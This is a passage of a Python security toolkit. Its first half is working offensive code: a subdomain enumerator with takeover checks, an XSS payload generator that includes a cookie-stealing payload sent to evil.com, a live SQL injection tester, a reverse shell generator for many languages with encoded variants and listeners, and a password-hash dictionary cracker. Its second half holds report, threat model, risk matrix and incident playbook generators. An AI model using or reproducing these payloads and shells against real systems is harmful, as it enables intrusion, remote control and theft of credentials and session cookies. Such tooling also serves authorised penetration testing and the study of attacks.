    results: Dict[str, Any] = {"domain": domain, "found": [], "errors": []}

    common_subs = [
        "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
        "blog", "dev", "staging", "stage", "test", "testing", "api", "app",
        "admin", "portal", "vpn", "remote", "gateway", "proxy",
        "cdn", "static", "assets", "media", "images", "img",
        "db", "database", "sql", "mysql", "mongo", "redis", "elastic",
        "git", "gitlab", "github", "bitbucket", "jenkins", "ci", "cd",
        "monitor", "grafana", "kibana", "prometheus", "nagios", "zabbix",
        "docs", "wiki", "help", "support", "status",
        "shop", "store", "payment", "billing", "checkout",
        "mx", "mx1", "mx2", "autodiscover", "exchange",
        "sso", "auth", "oauth", "login", "id", "identity",
        "aws", "s3", "cloud", "k8s", "kube", "docker", "container",
        "internal", "intranet", "corp", "office",
        "sandbox", "demo", "beta", "alpha", "preview",
        "backup", "bak", "old", "legacy", "archive",
    ]

    if wordlist == "extended":
        common_subs.extend([
            "www1", "www2", "web", "web1", "web2", "cpanel", "whm",
            "ns3", "ns4", "dns", "dns1", "dns2",
            "m", "mobile", "wap",
            "secure", "ssl", "tls",
            "cache", "edge", "origin",
            "uat", "qa", "preprod", "pre-prod",
            "chat", "irc", "slack", "teams",
            "jira", "confluence", "trello",
            "crm", "erp", "hr",
        ])

    for sub in common_subs:
        fqdn = f"{sub}.{domain}"
        try:
            answers = socket.getaddrinfo(fqdn, None)
            ips = list({ans[4][0] for ans in answers})
            results["found"].append({
                "subdomain": fqdn,
                "ips": ips,
                "type": "A/AAAA",
            })
        except socket.gaierror:
            pass
        except Exception as e:
            results["errors"].append({"subdomain": fqdn, "error": str(e)})

    for entry in results["found"]:
        cname_out = _run(["dig", "+short", "CNAME", entry["subdomain"]], timeout=5)
        if cname_out and "Error" not in cname_out and cname_out.strip():
            entry["cname"] = cname_out.strip()
            takeover_indicators = [
                "amazonaws.com", "azurewebsites.net", "cloudfront.net",
                "herokuapp.com", "ghost.io", "pantheon.io",
                "s3.amazonaws.com", "shopify.com", "github.io",
                "fastly.net", "surge.sh", "bitbucket.io",
            ]
            if any(ind in cname_out.lower() for ind in takeover_indicators):
                entry["potential_takeover"] = True
                entry["severity"] = "high"
                entry["note"] = f"Potential subdomain takeover via {cname_out.strip()}"

    results["summary"] = {
        "subdomains_checked": len(common_subs),
        "found_count": len(results["found"]),
        "takeover_candidates": sum(1 for f in results["found"] if f.get("potential_takeover")),
    }

    return results


def xss_payloads(
    context: str = "html",
    evasion_level: str = "basic",
    custom_tag: str = "",
) -> Dict[str, Any]:
    """Generate context-aware XSS payloads for testing."""
    payloads: Dict[str, List[str]] = {}

    if context in ("html", "all"):
        basic = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)>',
        ]
        evasion = [
            '<ScRiPt>alert(1)</ScRiPt>',
            '<img src=x onerror="&#97;lert(1)">',
            '<svg/onload=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
            '<iframe src="javascript:alert(1)">',
            '<img src=x onerror=alert`1`>',
            '<<script>alert(1)//<</script>',
        ]
        advanced = [
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '<svg><animate onbegin=alert(1) attributeName=x>',
            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
            '<a href="javas&#99;ript:alert(1)">click</a>',
            '${alert(1)}',
            '{{constructor.constructor("alert(1)")()}}',
        ]
        payloads["html"] = basic if evasion_level == "basic" else basic + evasion if evasion_level == "moderate" else basic + evasion + advanced

    if context in ("attribute", "all"):
        payloads["attribute"] = [
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '" onfocus="alert(1)" autofocus="',
            '" onload="alert(1)',
            "\" style=\"background:url(javascript:alert(1))\"",
            '" accesskey="x" onclick="alert(1)" x="',
        ]

    if context in ("javascript", "all"):
        payloads["javascript"] = [
            "'-alert(1)-'",
            "';alert(1)//",
            "\\';alert(1)//",
            "</script><script>alert(1)</script>",
            "'-alert(1)//",
            "${alert(1)}",
            "{{7*7}}",
        ]

    if context in ("url", "all"):
        payloads["url"] = [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "javascript:alert(document.domain)",
            "javas%09cript:alert(1)",
            "&#106;avascript:alert(1)",
            "javascript&colon;alert(1)",
        ]

    if context in ("dom", "all"):
        payloads["dom"] = [
            "#<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "\" onhashchange=\"alert(1)",
            "<img src=x onerror=eval(location.hash.slice(1))>",
            "';document.location='http://evil.com/steal?c='+document.cookie//",
        ]

    if custom_tag:
        payloads["custom"] = [
            f'<{custom_tag} onload=alert(1)>',
            f'<{custom_tag} onerror=alert(1)>',
            f'<{custom_tag} onfocus=alert(1) autofocus>',
            f'<{custom_tag} onmouseover=alert(1)>',
        ]

    total = sum(len(v) for v in payloads.values())
    return {
        "context": context,
        "evasion_level": evasion_level,
        "payloads": payloads,
        "total_payloads": total,
        "usage_note": "Test each payload in the target input field. Monitor for alert() execution or DOM changes.",
    }


def sql_injection_test(
    url: str,
    method: str = "GET",
    param: str = "id",
    test_type: str = "basic",
) -> Dict[str, Any]:
    """Test URL parameters for SQL injection vulnerabilities."""
    import time as _time

    results: Dict[str, Any] = {"url": url, "param": param, "method": method, "tests": []}

    basic_payloads = [
        ("Single quote", "'"),
        ("Double quote", '"'),
        ("OR true", "' OR '1'='1"),
        ("OR true (numeric)", "1 OR 1=1"),
        ("Comment", "' --"),
        ("Comment (#)", "' #"),
        ("AND false", "' AND '1'='2"),
        ("UNION probe", "' UNION SELECT NULL--"),
        ("Sleep (MySQL)", "' OR SLEEP(3)--"),
        ("Sleep (MSSQL)", "'; WAITFOR DELAY '0:0:3'--"),
        ("Sleep (PostgreSQL)", "'; SELECT pg_sleep(3)--"),
    ]

    error_payloads = [
        ("ExtractValue (MySQL)", "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--"),
        ("Convert (MSSQL)", "' AND 1=CONVERT(int, @@version)--"),
        ("Cast (PostgreSQL)", "' AND 1=CAST(version() AS int)--"),
        ("XMLType (Oracle)", "' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--"),
    ]

    union_payloads = [
        ("UNION 1 col", "' UNION SELECT NULL--"),
        ("UNION 2 cols", "' UNION SELECT NULL,NULL--"),
        ("UNION 3 cols", "' UNION SELECT NULL,NULL,NULL--"),
        ("UNION 5 cols", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"),
    ]

    blind_payloads = [
        ("Boolean true", "' AND 1=1--"),
        ("Boolean false", "' AND 1=2--"),
        ("Time true (MySQL)", "' AND IF(1=1, SLEEP(3), 0)--"),
        ("Time false (MySQL)", "' AND IF(1=2, SLEEP(3), 0)--"),
    ]

    all_payloads = basic_payloads
    if test_type in ("error", "full"):
        all_payloads += error_payloads
    if test_type in ("union", "full"):
        all_payloads += union_payloads
    if test_type in ("blind", "full"):
        all_payloads += blind_payloads

    error_indicators = [
        "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
        "microsoft sql", "unclosed quotation", "syntax error",
        "unterminated", "odbc", "jdbc", "sql server",
        "you have an error", "warning: mysql", "pg_query",
        "invalid query", "ora-", "sp_executesql",
    ]

    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    for name, payload in all_payloads:
        test_params = dict(params)
        test_params[param] = payload
        test_query = urllib.parse.urlencode(test_params)
        test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

        test_result: Dict[str, Any] = {
            "test": name,
            "payload": payload,
            "vulnerable": False,
        }

        try:
            req = urllib.request.Request(test_url)
            req.add_header("User-Agent", "Mozilla/5.0 (compatible; SQLiTest/1.0)")

            start_time = _time.time()
            with urllib.request.urlopen(req, timeout=15) as resp:
                elapsed = _time.time() - start_time
                body = resp.read(5000).decode("utf-8", errors="replace").lower()
                status = resp.getcode()

                test_result["status"] = status
                test_result["response_time"] = round(elapsed, 2)

                for indicator in error_indicators:
                    if indicator in body:
                        test_result["vulnerable"] = True
                        test_result["evidence"] = f"SQL error indicator found: '{indicator}'"
                        test_result["severity"] = "high"
                        break

                if "sleep" in name.lower() and elapsed > 2.5:
                    test_result["vulnerable"] = True
                    test_result["evidence"] = f"Time-based: response took {elapsed:.1f}s (expected delay)"
                    test_result["severity"] = "high"

        except urllib.error.HTTPError as e:
            test_result["status"] = e.code
            try:
                err_body = e.read(2000).decode("utf-8", errors="replace").lower()
                for indicator in error_indicators:
                    if indicator in err_body:
                        test_result["vulnerable"] = True
                        test_result["evidence"] = f"SQL error in {e.code} response: '{indicator}'"
                        test_result["severity"] = "high"
                        break
            except Exception:
                pass
        except Exception as e:
            test_result["error"] = str(e)[:200]

        results["tests"].append(test_result)

    vuln_tests = [t for t in results["tests"] if t.get("vulnerable")]
    results["summary"] = {
        "total_tests": len(results["tests"]),
        "vulnerable": len(vuln_tests),
        "risk_level": "critical" if vuln_tests else "low",
    }

    return results


def reverse_shell_gen(
    lhost: str,
    lport: int = 4444,
    shell_type: str = "all",
    encoding: str = "none",
) -> Dict[str, Any]:
    """Generate reverse shell payloads in multiple languages."""
    shells: Dict[str, str] = {}

    if shell_type in ("bash", "all"):
        shells["bash_tcp"] = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        shells["bash_udp"] = f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1"
        shells["bash_mkfifo"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"

    if shell_type in ("python", "all"):
        shells["python3"] = (
            f'python3 -c \'import socket,subprocess,os;'
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f's.connect(("{lhost}",{lport}));'
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        shells["python3_pty"] = (
            f'python3 -c \'import socket,subprocess,os,pty;'
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f's.connect(("{lhost}",{lport}));'
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"pty.spawn(\"/bin/bash\")'"
        )

    if shell_type in ("php", "all"):
        shells["php_exec"] = (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        )
        shells["php_proc_open"] = (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
        )

    if shell_type in ("nc", "netcat", "all"):
        shells["nc_traditional"] = f"nc -e /bin/sh {lhost} {lport}"
        shells["nc_openbsd"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        shells["ncat_ssl"] = f"ncat --ssl {lhost} {lport} -e /bin/sh"

    if shell_type in ("perl", "all"):
        shells["perl"] = (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");'
            f'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'')

    if shell_type in ("ruby", "all"):
        shells["ruby"] = (
            f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        )

    if shell_type in ("powershell", "all"):
        shells["powershell"] = (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
            f"{{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            f"$client.Close()"
        )

    if shell_type in ("socat", "all"):
        shells["socat"] = f"socat TCP:{lhost}:{lport} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane"

    if encoding == "base64" and shells:
        import base64
        encoded = {}
        for k, v in shells.items():
            b64 = base64.b64encode(v.encode()).decode()
            encoded[f"{k}_b64"] = f"echo {b64} | base64 -d | sh"
        shells.update(encoded)
    elif encoding == "url" and shells:
        encoded = {}
        for k, v in shells.items():
            encoded[f"{k}_urlenc"] = urllib.parse.quote(v)
        shells.update(encoded)

    listeners = {
        "nc_listener": f"nc -lvnp {lport}",
        "ncat_ssl_listener": f"ncat --ssl -lvnp {lport}",
        "socat_listener": f"socat TCP-LISTEN:{lport},reuseaddr,fork -",
        "rlwrap_listener": f"rlwrap nc -lvnp {lport}",
    }

    upgrade_tips = [
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "export TERM=xterm",
        "Ctrl+Z then: stty raw -echo; fg",
        "script -qc /bin/bash /dev/null",
    ]

    return {
        "lhost": lhost,
        "lport": lport,
        "shells": shells,
        "listeners": listeners,
        "shell_upgrade_tips": upgrade_tips,
        "total_payloads": len(shells),
    }


def hash_cracker(
    hash_value: str,
    hash_type: str = "auto",
    wordlist: str = "builtin",
    custom_words: str = "",
) -> Dict[str, Any]:
    """Dictionary attack on MD5/SHA1/SHA256/SHA512 hashes."""
    result: Dict[str, Any] = {"hash": hash_value, "cracked": False}

    h = hash_value.strip().lower()
    if hash_type == "auto":
        if h.startswith("$2b$") or h.startswith("$2a$") or h.startswith("$2y$"):
            hash_type = "bcrypt"
        elif len(h) == 32 and all(c in "0123456789abcdef" for c in h):
            hash_type = "md5"
        elif len(h) == 40 and all(c in "0123456789abcdef" for c in h):
            hash_type = "sha1"
        elif len(h) == 64 and all(c in "0123456789abcdef" for c in h):
            hash_type = "sha256"
        elif len(h) == 128 and all(c in "0123456789abcdef" for c in h):
            hash_type = "sha512"
        else:
            return {"error": f"Cannot auto-detect hash type for: {hash_value[:20]}...", "hint": "Specify hash_type: md5, sha1, sha256, sha512, bcrypt"}

    result["hash_type"] = hash_type

    builtin_words = [
        "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
        "letmein", "trustno1", "dragon", "baseball", "iloveyou", "master", "sunshine",
        "ashley", "michael", "shadow", "123123", "654321", "000000", "password1",
        "password123", "admin", "admin123", "root", "toor", "pass", "test", "guest",
        "changeme", "welcome", "welcome1", "1q2w3e4r", "qwerty123", "passw0rd",
        "p@ssw0rd", "p@ssword", "P@ssw0rd", "P@ssword1", "Summer2024", "Winter2024",
        "Spring2024", "Fall2024", "Summer2025", "Winter2025",
        "login", "hello", "charlie", "donald", "password2", "qwerty1",
        "aa123456", "access", "flower", "hottie", "loveme", "superman",
        "batman", "football", "soccer", "hockey", "basketball",
        "secret", "s3cr3t", "p4ssw0rd", "letmein1", "welcome123",
        "", "1234", "12345", "123456789", "1234567890",
    ]

    if custom_words:
        extra = [w.strip() for w in custom_words.split(",") if w.strip()]
        builtin_words = extra + builtin_words

    mutations = []
    for w in builtin_words[:30]:
        mutations.extend([
            w.upper(), w.capitalize(), w + "1", w + "!", w + "123",
            w + "2024", w + "2025", w + "@", w.replace("a", "@").replace("e", "3").replace("o", "0"),
        ])
    all_words = builtin_words + mutations

    if hash_type == "bcrypt":
        try:
            import bcrypt as bcrypt_mod
            for word in all_words:
                try:
                    if bcrypt_mod.checkpw(word.encode(), hash_value.encode()):
                        result["cracked"] = True
                        result["plaintext"] = word
                        break
                except Exception:
                    continue
        except ImportError:
            result["error"] = "bcrypt module not installed. Install with: pip install bcrypt"
            return result
    else:
        hash_fn = {
            "md5": hashlib.md5,
            "sha1": hashlib.sha1,
            "sha256": hashlib.sha256,
            "sha512": hashlib.sha512,
        }.get(hash_type)

        if not hash_fn:
            return {"error": f"Unsupported hash type: {hash_type}"}

        attempts = 0
        for word in all_words:
            attempts += 1
            computed = hash_fn(word.encode()).hexdigest()
            if computed == h:
                result["cracked"] = True
                result["plaintext"] = word
                result["attempts"] = attempts
                break

        result["total_attempts"] = attempts if not result["cracked"] else result.get("attempts", attempts)

    if not result["cracked"]:
        result["message"] = f"Hash not cracked after {len(all_words)} attempts. Try a larger custom wordlist."

    return result


# ===================================================================
# CONSULTING TOOLS (16-20)
# ===================================================================

def security_report(
    target: str,
    findings: str = "[]",
    report_type: str = "assessment",
    assessor: str = "Security Team",
) -> Dict[str, Any]:
    """Generate a security assessment report with risk ratings."""
    try:
        finding_list = json.loads(findings) if isinstance(findings, str) else findings
    except json.JSONDecodeError:
        finding_list = [{"title": findings, "severity": "medium", "description": findings}]

    severity_scores = {"critical": 10, "high": 8, "medium": 5, "low": 2, "informational": 1}

    enriched = []
    for i, f in enumerate(finding_list):
        sev = f.get("severity", "medium").lower()
        enriched.append({
            "id": f"FINDING-{i+1:03d}",
            "title": f.get("title", f"Finding {i+1}"),
            "severity": sev,
            "cvss_estimate": severity_scores.get(sev, 5),
            "description": f.get("description", ""),
            "impact": f.get("impact", f"Potential {sev}-impact security issue"),
            "recommendation": f.get("recommendation", "Review and remediate according to severity"),
            "status": f.get("status", "open"),
        })

    total_score = sum(severity_scores.get(f["severity"], 5) for f in enriched)
    max_score = len(enriched) * 10 if enriched else 10
    risk_pct = (total_score / max_score * 100) if max_score else 0

    counts = {}
    for f in enriched:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    now = datetime.now(timezone.utc).strftime("%Y-%m-%d")

    report = {
        "report_type": report_type,
        "metadata": {
            "target": target,
            "assessor": assessor,
            "date": now,
            "report_id": f"SEC-{now.replace('-', '')}-{abs(hash(target)) % 10000:04d}",
        },
        "executive_summary": {
            "overall_risk": (
                "Critical" if risk_pct >= 80 else
                "High" if risk_pct >= 60 else
                "Medium" if risk_pct >= 40 else
                "Low" if risk_pct >= 20 else
                "Informational"
            ),
            "risk_score": round(risk_pct, 1),
            "total_findings": len(enriched),
            "severity_breakdown": counts,
        },
        "findings": enriched,
        "recommendations_priority": sorted(enriched, key=lambda x: severity_scores.get(x["severity"], 0), reverse=True),
    }

    return report


def threat_model(
    system_name: str,
    components: str = "web_app,api,database",
    data_flows: str = "user->web_app,web_app->api,api->database",
    methodology: str = "stride",
) -> Dict[str, Any]:
    """Build a STRIDE threat model for a system."""
    comp_list = [c.strip() for c in components.split(",") if c.strip()]
    flow_list = [f.strip() for f in data_flows.split(",") if f.strip()]

    stride = {
        "S": {"name": "Spoofing", "description": "Impersonating something or someone else"},
        "T": {"name": "Tampering", "description": "Modifying data or code"},
        "R": {"name": "Repudiation", "description": "Claiming to have not performed an action"},
        "I": {"name": "Information Disclosure", "description": "Exposing information to unauthorized parties"},
        "D": {"name": "Denial of Service", "description": "Deny or degrade service to users"},
        "E": {"name": "Elevation of Privilege", "description": "Gain capabilities without proper authorization"},
    }

    threat_templates = {
        "web_app": {
            "S": [("Session hijacking via stolen cookies", "high"), ("CSRF attacks", "high")],
            "T": [("XSS — stored or reflected", "high"), ("Parameter tampering", "medium")],
            "R": [("Insufficient audit logging", "medium")],
            "I": [("Sensitive data in error messages", "medium"), ("Source code disclosure", "high")],
            "D": [("Application-layer DDoS", "high"), ("Resource exhaustion via large uploads", "medium")],
            "E": [("Broken access control (IDOR)", "critical"), ("JWT manipulation", "high")],
        },
        "api": {
            "S": [("API key theft or leakage", "high"), ("OAuth token replay", "high")],
            "T": [("Mass assignment vulnerabilities", "high"), ("SQL/NoSQL injection", "critical")],
            "R": [("Missing API request logging", "medium")],
            "I": [("Excessive data in API responses", "medium"), ("Broken object-level authorization", "high")],
            "D": [("Rate limiting bypass", "medium"), ("API abuse (scraping)", "medium")],
            "E": [("Broken function-level authorization", "high"), ("SSRF via API parameters", "high")],
        },
        "database": {
            "S": [("Default or weak DB credentials", "critical")],
            "T": [("SQL injection leading to data modification", "critical"), ("Unauthorized schema changes", "high")],
            "R": [("Database audit trail disabled", "medium")],
            "I": [("Unencrypted data at rest", "high"), ("Database backups exposed", "critical")],
            "D": [("Long-running queries causing locks", "medium"), ("Storage exhaustion", "medium")],
            "E": [("DB privilege escalation via stored procedures", "high")],
        },
    }

    generic = {
        "S": [("Credential theft or impersonation", "medium")],
        "T": [("Unauthorized data modification", "medium")],
        "R": [("Insufficient logging", "low")],
        "I": [("Data leak via misconfiguration", "medium")],
        "D": [("Resource exhaustion", "medium")],
        "E": [("Privilege escalation via misconfiguration", "medium")],
    }

    component_threats: Dict[str, Any] = {}
    threat_id = 1

    for comp in comp_list:
        threats = []
        template = threat_templates.get(comp, generic)
        for cat_key, cat_info in stride.items():
            cat_threats = template.get(cat_key, generic.get(cat_key, []))
            for threat_desc, severity in cat_threats:
                threats.append({
                    "id": f"T-{threat_id:03d}",
                    "category": cat_info["name"],
                    "category_code": cat_key,
                    "threat": threat_desc,
                    "severity": severity,
                    "component": comp,
                    "mitigation": "",
                    "status": "identified",
                })
                threat_id += 1
        component_threats[comp] = threats

    flow_threats = []
    for flow in flow_list:
        parts = flow.split("->")
        if len(parts) == 2:
            src, dst = parts[0].strip(), parts[1].strip()
            flow_threats.append({
                "flow": f"{src} -> {dst}",
                "threats": [
                    {"threat": "Data interception (MitM)", "mitigation": "Use TLS/mTLS"},
                    {"threat": "Data tampering in transit", "mitigation": "Message signing/HMAC"},
                    {"threat": "Replay attacks", "mitigation": "Nonces/timestamps"},
                ],
            })

    all_threats = []
    for threats in component_threats.values():
        all_threats.extend(threats)

    return {
        "system_name": system_name,
        "methodology": "STRIDE",
        "stride_categories": stride,
        "components": comp_list,
        "data_flows": flow_list,
        "component_threats": component_threats,
        "data_flow_threats": flow_threats,
        "summary": {
            "total_threats": len(all_threats),
            "by_severity": {
                s: sum(1 for t in all_threats if t["severity"] == s)
                for s in ("critical", "high", "medium", "low")
            },
            "by_category": {
                v["name"]: sum(1 for t in all_threats if t["category_code"] == k)
                for k, v in stride.items()
            },
        },
    }


def risk_matrix(
    risks: str = "[]",
    custom_risks: str = "",
) -> Dict[str, Any]:
    """Score risks using likelihood vs impact matrix."""
    try:
        risk_list = json.loads(risks) if isinstance(risks, str) else risks
    except json.JSONDecodeError:
        risk_list = []

    if custom_risks:
        for entry in custom_risks.split(";"):
            parts = entry.strip().split(",")
            if len(parts) >= 3:
                risk_list.append({
                    "name": parts[0].strip(),
                    "likelihood": int(parts[1].strip()) if parts[1].strip().isdigit() else 3,
                    "impact": int(parts[2].strip()) if parts[2].strip().isdigit() else 3,
                })

    if not risk_list:
        risk_list = [
            {"name": "Phishing attack", "likelihood": 5, "impact": 4},
            {"name": "Ransomware", "likelihood": 3, "impact": 5},
            {"name": "Insider threat", "likelihood": 2, "impact": 5},
            {"name": "DDoS attack", "likelihood": 4, "impact": 3},
            {"name": "SQL injection", "likelihood": 3, "impact": 5},
            {"name": "Misconfigured cloud storage", "likelihood": 4, "impact": 4},
            {"name": "Unpatched vulnerability", "likelihood": 4, "impact": 4},
            {"name": "Physical theft of device", "likelihood": 2, "impact": 3},
        ]

    rating_labels = {
        (1, 1): "negligible", (1, 2): "low", (1, 3): "low", (1, 4): "medium", (1, 5): "medium",
        (2, 1): "low", (2, 2): "low", (2, 3): "medium", (2, 4): "medium", (2, 5): "high",
        (3, 1): "low", (3, 2): "medium", (3, 3): "medium", (3, 4): "high", (3, 5): "high",
        (4, 1): "medium", (4, 2): "medium", (4, 3): "high", (4, 4): "high", (4, 5): "critical",
        (5, 1): "medium", (5, 2): "high", (5, 3): "high", (5, 4): "critical", (5, 5): "critical",
    }

    scored = []
    for risk in risk_list:
        l = max(1, min(5, int(risk.get("likelihood", 3))))
        i = max(1, min(5, int(risk.get("impact", 3))))
        score = l * i
        rating = rating_labels.get((l, i), "medium")
        scored.append({
            "name": risk["name"],
            "likelihood": l,
            "impact": i,
            "score": score,
            "rating": rating,
            "response_strategy": (
                "Immediate remediation required" if rating == "critical" else
                "Prioritize for near-term remediation" if rating == "high" else
                "Plan remediation in next cycle" if rating == "medium" else
                "Accept or monitor" if rating == "low" else
                "Accept"
            ),
        })

    scored.sort(key=lambda x: x["score"], reverse=True)

    counts = {}
    for s in scored:
        counts[s["rating"]] = counts.get(s["rating"], 0) + 1

    return {
        "risks": scored,
        "matrix_legend": {
            "likelihood": "1=Rare, 2=Unlikely, 3=Possible, 4=Likely, 5=Almost Certain",
            "impact": "1=Negligible, 2=Minor, 3=Moderate, 4=Major, 5=Catastrophic",
            "score": "likelihood x impact (1-25)",
        },
        "summary": {
            "total_risks": len(scored),
            "by_rating": counts,
            "highest_risk": scored[0] if scored else None,
            "avg_score": round(sum(s["score"] for s in scored) / len(scored), 1) if scored else 0,
        },
    }


def pentest_report(
    target: str,
    scope: str = "external",
    findings: str = "[]",
    tester: str = "Penetration Test Team",
    methodology: str = "OWASP",
) -> Dict[str, Any]:
    """Generate a full penetration test report template."""
    try:
        finding_list = json.loads(findings) if isinstance(findings, str) else findings
    except json.JSONDecodeError:
        finding_list = []

    now = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "informational": 4}

    enriched = []
    for i, f in enumerate(finding_list):
        sev = f.get("severity", "medium").lower()
        enriched.append({
            "id": f"PT-{i+1:03d}",
            "title": f.get("title", f"Finding {i+1}"),
            "severity": sev,
            "cvss_score": f.get("cvss", {"critical": 9.5, "high": 7.5, "medium": 5.0, "low": 2.5, "informational": 0}.get(sev, 5.0)),
            "description": f.get("description", ""),
            "affected_component": f.get("component", target),
            "steps_to_reproduce": f.get("steps", ["1. Navigate to target", "2. Inject payload", "3. Observe result"]),
            "evidence": f.get("evidence", "Screenshot/log evidence to be attached"),
            "impact": f.get("impact", ""),
            "recommendation": f.get("recommendation", ""),
            "references": f.get("references", []),
            "status": "open",
        })

    enriched.sort(key=lambda x: severity_order.get(x["severity"], 99))

    counts = {}
    for f in enriched:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    report = {
        "report_metadata": {
            "title": f"Penetration Test Report — {target}",
            "report_id": f"PT-{now.replace('-', '')}-{abs(hash(target)) % 10000:04d}",
            "date": now,
            "tester": tester,
            "methodology": methodology,
            "scope": scope,
            "classification": "CONFIDENTIAL",
        },
        "executive_summary": {
            "overview": f"A {scope} penetration test was conducted against {target} using {methodology} methodology.",
            "scope_description": (
                f"The assessment covered {'external-facing' if scope == 'external' else 'internal network'} "
                f"assets of {target}."
            ),
            "risk_rating": (
                "Critical" if counts.get("critical", 0) > 0 else
                "High" if counts.get("high", 0) > 0 else
                "Medium" if counts.get("medium", 0) > 0 else
                "Low"
            ),
            "total_findings": len(enriched),
            "severity_breakdown": counts,
            "key_findings_summary": [f["title"] for f in enriched[:5]],
        },
        "methodology": {
            "framework": methodology,
            "phases": [
                {"phase": "Reconnaissance", "description": "OSINT, DNS enumeration, port scanning"},
                {"phase": "Scanning", "description": "Vulnerability scanning, service detection"},
                {"phase": "Exploitation", "description": "Attempting to exploit identified vulnerabilities"},
                {"phase": "Post-Exploitation", "description": "Privilege escalation, lateral movement, data access"},
                {"phase": "Reporting", "description": "Documentation and remediation guidance"},
            ],
            "tools_used": [
                "Nmap", "Burp Suite", "SQLMap", "Nikto", "Gobuster",
                "Metasploit", "John the Ripper", "Custom scripts",
            ],
        },
        "findings": enriched,
        "remediation_roadmap": {
            "immediate_0_7_days": [f["title"] for f in enriched if f["severity"] == "critical"],
            "short_term_7_30_days": [f["title"] for f in enriched if f["severity"] == "high"],
            "medium_term_30_90_days": [f["title"] for f in enriched if f["severity"] == "medium"],
            "long_term_90_plus_days": [f["title"] for f in enriched if f["severity"] in ("low", "informational")],
        },
    }

    return report


def incident_playbook(
    incident_type: str = "ransomware",
    organization: str = "Organization",
) -> Dict[str, Any]:
    """Generate incident response playbooks for ransomware, data breach, and DDoS attacks."""
    playbooks: Dict[str, Any] = {}

    if incident_type in ("ransomware", "all"):
        playbooks["ransomware"] = {
            "title": f"{organization} Ransomware Response Playbook",
            "severity": "P1 — Critical",
            "immediate_actions": {
                "first_30_minutes": [
                    "ISOLATE: Disconnect affected systems from network (unplug, disable Wi-Fi)",
                    "DO NOT power off systems (preserves memory forensics)",
                    "DO NOT attempt to decrypt or pay ransom without executive approval",
                    "Notify IR team lead and CISO",
                    "Document: ransom note text, file extensions, IOCs",
                    "Take photographs of ransom screens",
                    "Identify patient zero and initial infection vector",
                ],
            },
            "containment": [
                "Block known C2 IPs/domains at firewall and DNS",
                "Disable compromised user accounts",
                "Segment network to prevent lateral spread",
                "Scan for ransomware indicators across all endpoints",
                "Preserve forensic images of affected systems",
                "Check backup integrity BEFORE connecting backups to network",
            ],
            "investigation": [
                "Identify ransomware variant (ID Ransomware, Crypto Sheriff)",
                "Determine encryption scope (files, drives, network shares)",
                "Trace infection timeline via logs (email, proxy, EDR)",
                "Check for data exfiltration (double extortion)",
                "Review Active Directory for persistence mechanisms",
                "Check for lateral movement (PsExec, WMI, RDP logs)",
            ],
            "recovery": [
                "Restore from clean, verified backups (test restore first)",
                "Rebuild compromised systems from known-good images",
                "Reset ALL passwords (domain admin first, then all users)",
                "Patch the vulnerability used for initial access",
                "Scan restored systems before reconnecting to network",
                "Monitor for re-infection for 72 hours minimum",
